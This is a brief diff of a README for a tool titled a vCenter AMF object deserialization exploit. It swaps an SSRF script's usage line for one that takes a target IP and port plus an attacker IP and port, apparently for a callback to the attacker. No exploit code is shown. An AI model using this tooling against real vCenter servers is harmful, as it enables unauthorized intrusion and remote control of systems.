@@ -4,5 +4,5 @@ vcenter AMF object deserialization exploit
 
 ## Usage  
 ```bash
-python3 random_ssrf.py http://target id.collab.net '/endpoint'
+python3 longtail targetip targetport  attackip attacker port
 ```
